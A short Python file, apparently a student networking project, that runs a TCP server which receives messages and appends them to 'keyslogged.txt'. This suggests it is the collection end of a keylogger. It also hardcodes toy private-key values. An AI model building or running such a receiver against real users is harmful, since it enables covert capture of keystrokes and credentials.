'''
server.py
Kezia Sharnoff

Basics of a TCP connection from Amy Csizmar Dalal CS331 Networks Fall 2025
https://github.com/acdalal/cs331-gopher/blob/main/gopherServer.py

'''

import sys, socket
DEFAULT_PORT = 48939

# Server private key
SERVER_n = 616487
SERVER_d = 279491

KEYS_FILE = "keyslogged.txt"


def decrypt(msg):
	pass


def writeToFile(keys):
	'''
	Write the keys inputted to a file
	'''
	try:
		with open(KEYS_FILE, "a") as file:
			file.write(keys)
	except:
		pass

def listen(serverSocket):
	'''
	Upon receiving a connection:
	- print that there is a connection
	- decode the bytes
	- print how long the message was
	- write the message to a file
	- close the connection
	'''

	serverSocket.listen(5)

	while True:
		clientSock, clientAddr = serverSocket.accept()

		try:
			print("Connection received from ",  clientSock.getpeername())
		except:
			print("Connection received from unknown host!")

		while True:
			try: 
				data = clientSock.recv(1024)
			except:
				break

			if not len(data):
				break

			try:
				decoded = data.decode("utf-8")
			except:
				decoded = ""

			print("Received message of length:", len(decoded))
			writeToFile(decoded)

		clientSock.close()


def create_server(port):
	'''
	Create a TCP server at the specific port
	'''
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	server.bind(("", port))
	return server

def main():
	server = create_server(DEFAULT_PORT)
	print("The server is running! It is at port", DEFAULT_PORT)
	listen(server)


main()